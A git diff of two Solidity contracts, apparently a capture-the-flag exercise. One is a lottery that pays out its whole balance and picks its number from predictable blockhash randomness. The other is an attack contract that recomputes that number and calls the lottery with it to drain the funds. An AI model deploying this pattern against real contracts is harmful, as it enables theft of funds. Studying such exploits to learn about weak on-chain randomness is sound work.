@@ -10,15 +10,16 @@ contract PrivateRyan {
 
     constructor() {
         seed = rand(256);
+ 
     }
 
     function spin(uint256 bet) public payable {
+       
         require(msg.value >= 0.01 ether);
+    
         uint256 num = rand(100);
         seed = rand(256);
-        if (num == bet) {
-            console.log("funciona en el atacante");
-            //msg.sender.transfer(this.balance);
+        if (num == bet) {        
             (bool succes, ) = payable(msg.sender).call{
                 value: address(this).balance
             }("");
@@ -52,25 +53,21 @@ contract atackPrivateRyan {
     uint256 private constant FACTOR =
         1157920892373161954235709850086879078532699846656405640394575840079131296399;
 
-    uint256 private seed = 1;
-
-    //uint256 private constant max = 100;
-
-    function rand(uint256 max) private view returns (uint256) {
-        //console.log("#bloque: ", block.number);
-        //console.log("#see: ", block.number);
-        uint256 factor = (FACTOR * 100) / max;
-        uint256 blockNumber = block.number - seed ;        
+    function rand(uint256 _max, uint256 _seed) private view returns (uint256) {
+      
+        uint256 factor = (FACTOR * 100) / _max;
+        uint256 blockNumber = block.number - _seed ;        
 
         uint256 hashVal = uint256(blockhash(blockNumber));      
-        uint256 random = uint256((uint256(hashVal) / factor)) % max;
+        uint256 random = uint256((uint256(hashVal) / factor)) % _max;
         return random;
     }
 
-    function functionAtack(uint256 _max) public payable {    
-        uint256 randon = rand(_max);       
-        //console.log("random ok: ", randon);
-        atack.spin(randon);
+    function functionAtack(uint256 _max, uint256 _seed) public payable {            
+        
+        uint256 randon = rand(_max, _seed);           
+        atack.spin{value:msg.value}(randon);
+        
     }
 
     receive() external payable {
@@ -78,11 +75,8 @@ contract atackPrivateRyan {
         require(succes);
     }
 
-    constructor(address payable _atack, uint256 _max) {
+    constructor(address payable _atack) {
         atackAddres = msg.sender;
         atack = PrivateRyan(_atack);
-        seed = rand(_max);
-
-        console.log( "seed: ", seed);
     }
 }
